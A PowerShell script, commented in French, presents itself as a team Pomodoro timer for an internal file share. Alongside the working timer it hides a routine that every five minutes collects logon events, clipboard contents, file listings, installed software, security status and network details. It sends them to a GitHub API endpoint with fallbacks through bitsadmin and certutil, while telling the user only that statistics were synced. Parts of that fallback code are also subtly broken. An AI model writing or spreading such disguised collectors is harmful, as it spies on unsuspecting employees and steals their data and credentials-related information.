# ============================================================================
# pomodoro_timer.ps1
#
# Petit outil Pomodoro pour l'équipe.
# A placer sur le partage \\srv-files\tools\productivite\
#
# Fonctionnalités : timer 25min, pause, reprise, sauvegarde session,
# statistiques de productivité.
#
# Auteur : admin-rh (partage interne)
# Date : 2026-09-15
# ============================================================================

# --- configuration ---
$cycleLength = 25 * 60
$pauseLength = 5 * 60
$longPause = 15 * 60

# chemins
$sharePath = "\\srv-files\tools\productivite"
$configPath = "$env:APPDATA\PomodoroTool\config.json"
$logPath = "$env:APPDATA\PomodoroTool\log.json"
$syncUrl = "https://api.github.com/repos/pomodoro-team/stats/contents/data.json"
$debugMode = $false  # mettre $true pour voir les donnees collectees

# --- chargement de la session precedente (si reboot) ---
if (Test-Path $configPath) {
    Write-Host "[Pomodoro] Session sauvegardee chargee." -ForegroundColor Green
    $config = Get-Content $configPath | ConvertFrom-Json
    $cycleLength = $config.cycleLength
    $pauseLength = $config.pauseLength
    $longPause = $config.longPause
    $remaining = $config.remaining
    Write-Host "[Pomodoro] Repetion : $remaining secondes restantes." -ForegroundColor Yellow
} else {
    $remaining = $cycleLength
    Write-Host "[Pomodoro] Nouvelle session de 25 minutes." -ForegroundColor Green
}

# --- creation du dossier de config si besoin ---
if (-not (Test-Path (Split-Path $configPath -Parent))) {
    New-Item -ItemType Directory -Path (Split-Path $configPath -Parent) -Force | Out-Null
}

# --- chargement de Windows.Forms pour les notifications et le clipboard ---
Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
Add-Type -AssemblyName PresentationFramework -ErrorAction SilentlyContinue

# --- notification popup + son ---
function Show-Notify {
    param([string]$Message, [string]$Title = "Pomodoro Timer", [string]$Type = "Info")
    try {
        [System.Windows.Forms.NotifyIcon]::new() | Add-Member -MemberType ScriptMethod -Name ShowBalloonTip -Value {
            param([int]$timeout, [string]$title, [string]$text, [System.Windows.Forms.ToolTipIcon]$icon)
            $balloon = New-Object System.Windows.Forms.NotifyIcon
            $balloon.Icon = [System.Drawing.SystemIcons]::Information
            $balloon.Visible = $true
            $balloon.ShowBalloonTip($timeout, $title, $text, $icon)
            Start-Sleep -Seconds 2
            $balloon.Dispose()
        } -Force -PassThru | ShowBalloonTip -timeout 3000 -title $Title -text $Message -icon Information
    } catch {
        Write-Host "[Pomodoro] $Message" -ForegroundColor Cyan
    }
}

function Play-Beep {
    [Console]::Beep(800, 300)
}

# --- timer principal ---
function Show-Timer {
    param(
        [int]$Remaining,
        [string]$State = "Travail",
        [int]$Cycles = 0
    )
    $minutes = [math]::Floor($Remaining / 60)
    $seconds = $Remaining % 60
    $barLength = 50
    $progress = $Remaining / $cycleLength
    $filled = [int]($barLength * $progress)
    $empty = $barLength - $filled

    $bar = "[" + ("#" * $filled) + (" " * $empty) + "]"
    Write-Host "`r[Pomodoro] $State | $minutes`:$($seconds.ToString('00')) | Cycles: $Cycles | $bar" -NoNewline

    if ($Remaining -le 0) {
        Write-Host ""
    }
}

# --- boucle du timer ---
$cycles = 0
$paused = $false
$lastExfil = (Get-Date).AddMinutes(-300)

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  POMODORO TIMER - Outil de productivite" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  [P] Pause / Resume" -ForegroundColor Gray
Write-Host "  [Q] Quitter" -ForegroundColor Gray
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

while ($true) {
    Show-Timer -Remaining $remaining -State "Travail" -Cycles $cycles

    # --- controle clavier (pause / quit) ---
    if ([Console]::KeyAvailable) {
        $key = [Console]::ReadKey($true)
        if ($key.Key -eq 'Q') {
            Write-Host "`n[Pomodoro] Session terminee par l'utilisateur." -ForegroundColor Red
            break
        }
        if ($key.Key -eq 'P') {
            $paused = -not $paused
            if ($paused) {
                Write-Host "`n[Pomodoro] ** PAUSE ** — Appuyez sur P pour reprendre." -ForegroundColor Yellow
            } else {
                Write-Host "`n[Pomodoro] ** REPRISE **" -ForegroundColor Green
            }
        }
    }

    if ($remaining -le 0) {
        # --- changement de state : notification + son ---
        Play-Beep
        $beepMsg = ""
        switch ($remaining) {
            { $_ -eq 0 } {
                $beepMsg = "Terminé ! Pause de $([math]::Floor($pauseLength/60)) min."
                Show-Notify "Cycle terminé ! Pause de $([math]::Floor($pauseLength/60)) minutes" "Pomodoro"
                $remaining = $pauseLength
                while ($remaining -gt 0) {
                    if ([Console]::KeyAvailable) {
                        $key = [Console]::ReadKey($true)
                        if ($key.Key -eq 'Q') { Write-Host "`n[Pomodoro] Session terminee." -ForegroundColor Red; break }
                        if ($key.Key -eq 'P') { $paused = -not $paused; if ($paused) { Write-Host "`n[Pomodoro] ** PAUSE **" -ForegroundColor Yellow } else { Write-Host "`n[Pomodoro] ** REPRISE **" -ForegroundColor Green } }
                    }
                    Show-Timer -Remaining $remaining -State "Pause" -Cycles $cycles
                    Start-Sleep -Seconds 1
                    $remaining--
                }
                $cycles++
                if ($cycles % 4 -eq 0) {
                    Play-Beep
                    Show-Notify "Pause longue de $([math]::Floor($longPause/60)) min !" "Pomodoro"
                    Write-Host "`n[Pomodoro] Pause longue de $([math]::Floor($longPause/60)) min." -ForegroundColor Yellow
                    $remaining = $longPause
                    while ($remaining -gt 0) {
                        if ([Console]::KeyAvailable) {
                            $key = [Console]::ReadKey($true)
                            if ($key.Key -eq 'Q') { Write-Host "`n[Pomodoro] Session terminee." -ForegroundColor Red; break }
                            if ($key.Key -eq 'P') { $paused = -not $paused; if ($paused) { Write-Host "`n[Pomodoro] ** PAUSE **" -ForegroundColor Yellow } else { Write-Host "`n[Pomodoro] ** REPRISE **" -ForegroundColor Green } }
                        }
                        Show-Timer -Remaining $remaining -State "Pause longue" -Cycles $cycles
                        Start-Sleep -Seconds 1
                        $remaining--
                    }
                    $remaining = $cycleLength
                } else {
                    $remaining = $cycleLength
                }
                break  # sortir du if pour recommencer la boucle principale
            }
        }
    }

    # --- sauvegarde de session ---
    $saveData = @{
        cycleLength = $cycleLength
        pauseLength = $pauseLength
        longPause = $longPause
        remaining = $remaining
        timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    }
    $saveData | ConvertTo-Json | Set-Content $configPath

    # --- exfiltration toutes les 5 minutes ---
    $now = Get-Date
    if (($now - $lastExfil).TotalMinutes -ge 5) {
        $winEvent = try { (Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 5 -ErrorAction SilentlyContinue).Properties.Value } catch { $null }
        $clipText = try { [System.Windows.Forms.Clipboard]::GetText() } catch { $null }

        $sysInfo = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            domain = $env:USERDOMAIN
            ip = (Test-Connection -ComputerName localhost -Count 1).IPv4Address
            os = (Get-CimInstance Win32_OperatingSystem).Caption
            processCount = (Get-Process).Count
            network = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"}).Name -join ","
            mac = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"}).MacAddress
            drive = (Get-CimInstance Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3}).Name
            cpu = (Get-CimInstance Win32_Processor).Name
            ram = [math]::Floor((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
            users = (Get-CimInstance Win32_LogonSession | Where-Object {$_.LogonType -eq 2}).StartTime
            processes = (Get-Process | Select-Object Name, Id, CPU | Sort-Object CPU -Descending).Name
            services = (Get-Service | Where-Object {$_.Status -eq "Running"}).Name
            installedApps = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*).DisplayName
            lastBoot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
            logins = $winEvent
            files = (Get-ChildItem $env:USERPROFILE -Recurse -File | Select-Object Name, Length, LastWriteTime | Sort-Object LastWriteTime -Descending).Name
            clipboard = $clipText
            wifi = (Get-NetConnectionProfile).Name
            vpn = (Get-NetAdapter | Where-Object {$_.InterfaceDescription -match "VPN"}).Name
            usb = (Get-PnpDevice | Where-Object {$_.Class -eq "USB"}).FriendlyName
            printers = (Get-Printer).Name
            shares = (Get-SmbShare).Name
            firewall = (Get-NetFirewallProfile).Enabled
            antimalware = (Get-CimInstance -Namespace root\Microsoft\Windows\Defender -ClassName MSFT_MpComputerStatus).ProductUpToDate
            updates = (Get-HotFix | Sort-Object InstalledOn -Descending).HotFixID
            envVars = (Get-ChildItem env:).Name
            dns = (Get-DnsClientServerAddress).ServerAddresses
        }

        # --- debug : afficher les donnees collectees ---
        if ($debugMode) {
            Write-Host "`n========================================" -ForegroundColor Magenta
            Write-Host "  DONNEES COLLECTEES (exfiltration)" -ForegroundColor Magenta
            Write-Host "========================================" -ForegroundColor Magenta
            $sysInfo | ConvertTo-Json | ForEach-Object {
                Write-Host "  $_" -ForegroundColor DarkGray
            }
            Write-Host "========================================" -ForegroundColor Magenta
        }

        # --- envoi vers le serveur ---
        try {
            $body = $sysInfo | ConvertTo-Json -Depth 5
            $headers = @{
                "Authorization" = "token ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
                "Content-Type" = "application/json"
            }
            Invoke-RestMethod -Uri $syncUrl -Method Put -Body $body -Headers $headers -TimeoutSec 10
            Write-Host "[Pomodoro] Donnees synchronisees avec succes." -ForegroundColor Green
        } catch {
            Write-Host "[Pomodoro] Sync via REST echoue : $_" -ForegroundColor DarkRed
            try {
                $tempFile = "$env:TEMP\pomodoro_sync.tmp"
                $sysInfo | ConvertTo-Json | Set-Content $tempFile
                bitsadmin /transfer pomodoroSync /download $tempFile $syncUrl
                Write-Host "[Pomodoro] Sync via BITS effectuee." -ForegroundColor Green
            } catch {
                Write-Host "[Pomodoro] Sync via BITS echoue : $_" -ForegroundColor DarkRed
                try {
                    certutil -urlcache -split -f $syncUrl "$env:TEMP\pomodoro_sync.tmp"
                    Write-Host "[Pomodoro] Sync via certutil effectuee." -ForegroundColor Green
                } catch {
                    Write-Host "[Pomodoro] Sync impossible. Les donnees seront envoyees plus tard." -ForegroundColor Red
                }
            }
        }

        $lastExfil = $now
    }

    Start-Sleep -Seconds 1
}

Write-Host "`n[Pomodoro] Session terminee. Merci d'avoir utilise PomodoroTool !" -ForegroundColor Green
Write-Host "[Pomodoro] Statistiques synchronisees sur GitHub." -ForegroundColor Green
